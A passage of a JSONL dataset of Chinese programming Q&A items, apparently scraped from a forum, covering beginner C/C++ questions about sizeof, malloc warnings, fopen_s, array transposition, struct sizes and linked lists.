q->rear)", "            return false;", "        q->front = (q->front + 1) % Maxsize;", "        e = q->data[front];", "        return true;", "    }", "    void Number(int n)", "    {", "        Queue* q = new Queue;", "        int e = 0;", "        InitQueue(q);", "        for (int i = 0; i <= n; i++)", "            InQueue(q, i);", "        while (!IsEmpty(q))", "        {", "            OutQueue(q, e);", "            cout << e;", "            if (!IsEmpty(q))", "            {", "                OutQueue(q, e);", "                InQueue(q, e);", "            }", "        }", "        cout << endl;", "        delete q;", "    }", "};", "int main()", "{", "    Queue St;", "    int n;", "    cout << \"请输入队伍人数:\" << endl;", "    cin >> n;", "    St.Number(n);", "    system(\"pause\");", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;能让我看看具体的警告是什么吗&amp;#xff1f;我这里运行没有任何警告或错误显示&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/641267728766138.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["一个警告，能顺利运行，我知道可以用其他方法做，只是想解决为什么被警告，不知错在哪了\n问题：在主函数中输入10个等长的字符串。用另一函数对他们排序。然后在主函数输出", ["问题遇到的现象和发生背景", "\n", "一个警告，能顺利运行，我知道可以用其他方法做，只是想解决为什么被警告，不知错在哪了", "题目：在主函数中输入10个等长的字符串。用另一函数对他们排序。然后在主函数输出", "\n", "用代码块功能插入代码，请勿粘贴截图", "\n", "#pragma warning(disable : 4996)", "#include<stdio.h>", "#include<stdlib.h>", "#include<string.h>", "#define N 10", "\n", "int main()", "{", "    void sort(char* p1[]);", "    char* p[N];", "    int i;", "    printf(\"enter 10 strings of equal length:\\n\");", "    for (i = 0; i < N; i++)", "    {", "        p[i] = (char*)malloc(sizeof(char) * N);       //1.申请内存空间", "        if (p[i] == NULL   )                             //2.判断有没有申请成功", "        {", "            printf(\"malloc failed\");                    //如果p[i]是一个空地址，就说明申请失败", "        }", "        memset(p[i], 0, sizeof(char) * N);            //3.对新申请的内存空间初始化", "    }", "    for (i = 0; i < N; i++)", "    {", "        scanf(\"%s\", p[i]);                        //4.开始使用", "    }", "    printf(\"after sort:\\n\");", "    sort(p);", "    for (i = 0; i < N; i++)", "    {", "        printf(\"%s\", p[i]);", "        printf(\"\\n\");", "    }", "    for (i = 0; i < N; i++)", "    {", "        free(p[i]);                            //5.输出后，释放内存", "        p[i] = NULL;                //6.避免出现野指针，将指针的值置零", "    }", "    return 0;", "}", "void sort(char* p1[])", "{", "    int i, j;", "    char* pt;", "    for (i = 0; i < N - 1; i++)", "    {", "        for (j = i + 1; j < N; j++)", "        {", "            if (strcmp(p1[i], p1[j]) > 0)", "            {", "                pt = p1[i];", "                p1[i] = p1[j];", "                p1[j] = pt;", "            }", "        }", "    }", "}", "\n", "运行结果及报错内容", "\n", "严重性    代码    说明    项目    文件    行    禁止显示状态", "警告    C6387    \"p[i]\" 可以是 \"0\"。    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;试试这样可以吗&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; _CRT_SECURE_NO_WARNINGS&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; ch;\n    FILE* fp;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; fname[&lt;span class=\"hljs-number\"&gt;50&lt;/span&gt;];\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Enter the name of the file:&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;scanf_s&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, fname, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(fname));\n    fp &amp;#61; &lt;span class=\"hljs-built_in\"&gt;fopen&lt;/span&gt;(fopen, &lt;span class=\"hljs-string\"&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);&lt;span class=\"hljs-comment\"&gt;//问题就出在这里&amp;#xff0c;用fopen_s替代过&amp;#xff0c;显示不接受两个函数&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//这段代码是C Primer Plus第六版193页的&amp;#xff0c;用的是vs2017&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;有帮助望采纳&amp;#xff0c;谢谢&amp;#xff01;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["fopen在vs中不可用，用fopen_s替换后显示不接受两个函数", ["\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "int", " ", "main", "(", "void", ")", "\n", "{\n", "int", " ch;\nFILE*fp;\n", "char", " fname[", "50", "];\n", "printf", "(", "\"Enter the name of the file:\"", ");\n", "scanf_s", "(", "\"%s\"", ",fname,", "sizeof", "(fname));\nfp=", "fopen", "(fopen,", "\"r\"", ");", "//问题就出在这里，用fopen_s替代过，显示不接受两个函数", "\n", "//这段代码是C Primer Plus第六版193页的，用的是vs2017", "\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;char a[]&amp;#61;{&amp;#39;a&amp;#39;,&amp;#39;b&amp;#39;,&amp;#39;c&amp;#39;}; //这是字符数组&amp;#xff0c;里面有三个单字符元素.&lt;br /&gt;\nsizeof(a)的值应该为3。&lt;br /&gt;\nchar b[]&amp;#61;{&amp;#34;abc&amp;#34;};      //这是字符串&amp;#xff0c;里面隐含了&amp;#39;\\0&amp;#39;,实际为&amp;#xff1a;&amp;#34;abc\\0&amp;#34;.&lt;br /&gt;\nsizeof(b)的值应该是4。&lt;/p&gt;\n\n&lt;p&gt;//C&amp;#43;&amp;#43;中&amp;#xff0c;string 是类&amp;#xff0c;要想使用标准C&amp;#43;&amp;#43;中string类&amp;#xff0c;必须要包含 #include &amp;lt;string&amp;gt; 。&lt;/p&gt;\n\n&lt;p&gt;若string str&amp;#61;{&amp;#39;a&amp;#39;,&amp;#39;b&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;\\0&amp;#39;,&amp;#39;X&amp;#39;};&lt;br /&gt;\n那么sizeof(str)为5&amp;#xff0c;strlen(str)为3&lt;/p&gt;\n\n&lt;p&gt;string strOutput &amp;#61; &amp;#34;Hello World&amp;#34;;&lt;br /&gt;\nint nLen &amp;#61; strOutput.length();&lt;br /&gt;\n//string使用 length() 方法计算字符串长度&amp;#xff0c;该方法计算结果为字符串的实际长度&lt;br /&gt;\n//string使用 compare(const string&amp;amp; str) 方法进行字符串比较,还有很多方法&amp;#xff0c;可以去搜下。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++ 字符串相关问题", ["1.char[] as是什么？", "\n\n", "\n", "char[] a={'a','b','c'};\nsizeof(a)的值应该为3。\nchar[] b={\"abc\"};\nsizeof(b)的值应该是4。", "\n\n", "2.", "\n\n", "string str是什么类型？sizeof(str)调试结果为什么是24？，strlen(str)调试不出来结果，报错？", "\n\n", "\n", "若string str={'a','b','c','\\0','X'};\n那么sizeof(str)为5，strlen(str)为3", "\n\n", "\n "]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; _CRT_SECURE_NO_WARNINGS 1&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n \n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;** &lt;span class=\"hljs-title\"&gt;Acc&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; **acc, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n, &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; m)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-comment\"&gt;//定义动态二维数组&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;** p;  &lt;span class=\"hljs-comment\"&gt;//定义二维指针。&lt;/span&gt;\n    p &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;**)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*) * m); &lt;span class=\"hljs-comment\"&gt;//申请一组一维指针空间。&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; m; i&amp;#43;&amp;#43;)\n    {\n       p[i] &amp;#61; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;) * n);  &lt;span class=\"hljs-comment\"&gt;//对于每个一维指针&amp;#xff0c;申请一行数据的空间。&lt;/span&gt;\n    }\n    &lt;span class=\"hljs-comment\"&gt;//将数组的值转置并赋值给动态数组&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; m; i&amp;#43;&amp;#43;)\n    {\n       &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; j &amp;lt; n; j&amp;#43;&amp;#43;)\n       {\n           p[i][j] &amp;#61; *((&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;*)acc&amp;#43;j*m&amp;#43;i);\n       }\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; p;\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; arr[&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;][&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;] &amp;#61; { {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;},{&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;} };\n    \n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; n &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, m &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    n &amp;#61; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr) / &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]);&lt;span class=\"hljs-comment\"&gt;//计算二维数组的行数&lt;/span&gt;\n    m&amp;#61; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]) / &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;][&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]);&lt;span class=\"hljs-comment\"&gt;//计算二维数组的列数&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; **p &amp;#61; &lt;span class=\"hljs-built_in\"&gt;Acc&lt;/span&gt;(arr, n, m);\n    \n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;i&amp;lt;m;i&amp;#43;&amp;#43;){\n        &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; j&amp;#61;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;j&amp;lt;n;j&amp;#43;&amp;#43;){\n            &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\t&amp;#34;&lt;/span&gt;, p[i][j]);\n        }\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;\\n&amp;#34;&lt;/span&gt;);\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n \n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["动态二维数组的转置问题", ["问题遇到的现象和发生背景", "\n", "今天写代码发现一个问题，就是动态二维数组可以通过传参的方式传到另一个函数吗？", "\n", "问题相关代码，请勿粘贴截图", "\n", "我的代码如下，我想将随便给定一个二维数组传到Acc里面并进行转置，当然  在主函数里转置已经完成了，当我们在使用的时候肯定不会是在主函数里使用吧，肯定是随机给出一个二维数组，最后给出转置后的结果，难在二维数组的行数和列数不确定，有知道的小伙伴一定要告诉我啊，谢谢", "\n", "#", "define", " _CRT_SECURE_NO_WARNINGS 1", "\n", "#include <stdio.h>", "\n\n", "void", " ", "Acc", "(", "int", " *acc, ", "int", " n, ", "int", " m", ")", "\n{\n    \n}\n", "int", " ", "main", "(", ")", "\n{\n    ", "int", " arr[", "2", "][", "3", "] = { {", "1", ",", "2", ",", "3", "},{", "4", ",", "5", ",", "6", "} };\n    \n    ", "int", " n = ", "0", ", m = ", "0", ";\n    n = ", "sizeof", "(arr) / ", "sizeof", "(arr[", "0", "]);", "//计算二维数组的行数", "\n    m= ", "sizeof", "(arr[", "0", "]) / ", "sizeof", "(arr[", "0", "][", "0", "]);", "//计算二维数组的列数", "\n    Acc(&arr, n, m);\n    ", "///", "/定义动态二维数组", "\n    ", "//int** p;  //定义二维指针。", "\n    ", "//p = (int**)malloc(sizeof(int*) * m); //申请一组一维指针空间。", "\n    ", "//for (int i = 0; i < m; i++)", "\n    ", "//{", "\n    ", "//    p[i] = (int*)malloc(sizeof(int) * n);  //对于每个一维指针，申请一行数据的空间。", "\n    ", "//}", "\n    ", "///", "/将数组的值转置并赋值给动态数组", "\n    ", "//for (int i = 0; i < m; i++)", "\n    ", "//{", "\n    ", "//    for (int j = 0; j < n; j++)", "\n    ", "//    {", "\n    ", "//        p[i][j] = arr[j][i];", "\n    ", "//        printf(\"%d\\t\", p[i][j]);", "\n    ", "//    }", "\n    ", "//    printf(\"\\n\");", "\n    ", "//}", "\n\n    ", "///", "/释放内存", "\n    ", "//for (int i = 0; i < m; i++)", "\n    ", "//    free(p[i]);", "\n    ", "//free(p);", "\n    ", "return", " ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;数组第一个元素的大小&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["霸霸们，这是什么意思？", ["sizeof( arr〔0〕)是什么意思？代表什么？", "int arr〔10〕;", "printf(“% d\\n”, sizeof(arr)/sizeo( arr[0]));"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;12&amp;#xff0c;8&amp;#xff1f;&lt;br /&gt;struxt本身12长度&lt;br /&gt;地址8长度&lt;br /&gt;有帮助望采纳&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["分析一下下面两个打印分别输出什么", ["struct", "\n{\n    ", "int", " day;\n    ", "char", " mouth;\n    ", "int", " year;\n}bb,*cc;\n\n", "printf", "(", "\"%d\"", ", ", "sizeof", " (bb));\n", "printf", "(", "\"%d\"", ", ", "sizeof", " (cc));\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;using&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;namespace&lt;/span&gt; std;\n\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt;\n{\n    &lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; num; &lt;span class=\"hljs-comment\"&gt;//学号&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; name[&lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;]; &lt;span class=\"hljs-comment\"&gt;//姓名&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; sex; &lt;span class=\"hljs-comment\"&gt;//性别&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;float&lt;/span&gt; score; &lt;span class=\"hljs-comment\"&gt;//成绩&lt;/span&gt;\n};\n\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;SLink&lt;/span&gt;\n{\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; s;\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;SLink&lt;/span&gt;* next;\n} *np;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;createLink&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    np &amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;;\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;insertData&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; Student s)&lt;/span&gt; \n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (np &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;){\n        np &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink));\n        np-&amp;gt;s &amp;#61; s;\n        np-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;;\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt;;\n    }\n    SLink* pPrevNode &amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;;\n    SLink* pNode &amp;#61; np;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (pNode) {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (s.num &amp;lt;&amp;#61; pNode-&amp;gt;s.num) {\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pPrevNode &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;) {\n                np &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink));\n                np-&amp;gt;s &amp;#61; s;\n                np-&amp;gt;next &amp;#61; pNode;\n            }\n            &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; {\n                pPrevNode-&amp;gt;next &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink));\n                pPrevNode-&amp;gt;next-&amp;gt;s &amp;#61; s;\n                pPrevNode-&amp;gt;next-&amp;gt;next &amp;#61; pNode;\n            }\n            &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pNode-&amp;gt;next &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;){\n            pNode-&amp;gt;next &amp;#61; (&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; SLink));\n            pNode-&amp;gt;next-&amp;gt;s &amp;#61; s;\n            pNode-&amp;gt;next-&amp;gt;next &amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;;\n            &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n        }\n        pPrevNode &amp;#61; pNode;\n        pNode &amp;#61; pNode-&amp;gt;next;\n    }\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;deleteData&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;long&lt;/span&gt; num)&lt;/span&gt;\n&lt;/span&gt;{\n    SLink* pPrevNode &amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;;\n    SLink* pNode &amp;#61; np;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (pNode){\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (num &amp;#61;&amp;#61; pNode-&amp;gt;s.num){\n            &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (pPrevNode &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;nullptr&lt;/span&gt;){\n                np &amp;#61; pNode-&amp;gt;next;\n            }\n            &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;{\n                pPrevNode-&amp;gt;next &amp;#61; pNode-&amp;gt;next;\n            }\n            &lt;span class=\"hljs-comment\"&gt;//SLink* pNext &amp;#61; pNode-&amp;gt;next;&lt;/span&gt;\n            &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(pNode);\n            &lt;span class=\"hljs-keyword\"&gt;break&lt;/span&gt;;\n           &lt;span class=\"hljs-comment\"&gt;// pNode &amp;#61; pNext;&lt;/span&gt;\n        }\n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;{\n            pPrevNode &amp;#61; pNode;\n            pNode &amp;#61; pNode-&amp;gt;next;\n        }\n    }\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;printStudent&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-keyword\"&gt;const&lt;/span&gt; Student&amp;amp; stud)&lt;/span&gt;\n&lt;/span&gt;{\n    cout &amp;lt;&amp;lt; stud.num &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;\\t&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; stud.name &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;\\t&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; (stud.sex ? &lt;span class=\"hljs-string\"&gt;&amp;#34;male&amp;#34;&lt;/span&gt; : &lt;span class=\"hljs-string\"&gt;&amp;#34;female&amp;#34;&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;\\t&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; stud.score &amp;lt;&amp;lt; endl;\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;printLink&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt; \n&lt;/span&gt;{\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;num\\t&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;name\\t&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;sex\\t&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#34;score&amp;#34;&lt;/span&gt; &amp;lt;&amp;lt; endl;\n    SLink* pNode &amp;#61; np;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (pNode) {\n        &lt;span class=\"hljs-built_in\"&gt;printStudent&lt;/span&gt;(pNode-&amp;gt;s);\n        pNode &amp;#61; pNode-&amp;gt;next;\n    }\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt;)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;createLink&lt;/span&gt;();\n\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; a {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;,  &lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;};\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; b {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;b&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;,  &lt;span class=\"hljs-number\"&gt;90&lt;/span&gt;};\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; c {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;c&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;,  &lt;span class=\"hljs-number\"&gt;80&lt;/span&gt;};\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; d {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-literal\"&gt;true&lt;/span&gt;,  &lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;};\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Student&lt;/span&gt; e 